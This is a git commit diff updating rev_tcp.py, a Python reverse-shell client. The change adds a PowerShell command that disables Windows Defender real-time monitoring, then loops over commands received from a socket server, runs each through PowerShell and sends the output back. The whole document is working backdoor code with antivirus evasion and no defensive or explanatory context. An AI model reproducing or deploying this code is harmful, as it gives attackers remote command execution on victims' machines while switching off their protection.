658a22ce75307d8642c8fcd3b5b6261993b6ffdc
the-alias <39953366+the-alias@users.noreply.github.com>
2023-08-15 11:36:43 +0300

    Update rev_tcp.py
    fixes

--- rev_tcp.py
+++ rev_tcp.py
@@ -15,30 +15,33 @@ def run_powershell_command(command):
     return result
 
 def main():
+    run_powershell_command("Set-MpPreference -DisableRealtimeMonitoring $true")
     # Server address and port
     host = '127.0.0.1'
     port = 12345
-
+    check = "text"
     # Create a socket object
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    # Connect to the server
+    client_socket.connect((host, port))
 
-    try:
-        # Connect to the server
-        client_socket.connect((host, port))
+    while "exit" not in check:
+        try:
 
-        # Receive the response from the server
-        cmnd = client_socket.recv(1024)
+            # Receive the response from the server
+            cmnd = client_socket.recv(1024)
 
-        out = run_powershell_command(cmnd)
+            out = run_powershell_command(cmnd)
 
-        client_socket.sendall(out.encode('utf-8'))
-
-    except Exception as e:
-        print("An error occurred:", str(e))
-
-    finally:
-        # Close the connection
-        client_socket.close()
+            check = str(cmnd)
+            
+            client_socket.sendall(out.encode('utf-8'))
+            
+        except Exception as e:
+            print("An error occurred:", str(e))
+            client_socket.close()
+    client_socket.close()
 
 if __name__ == "__main__":
     main()
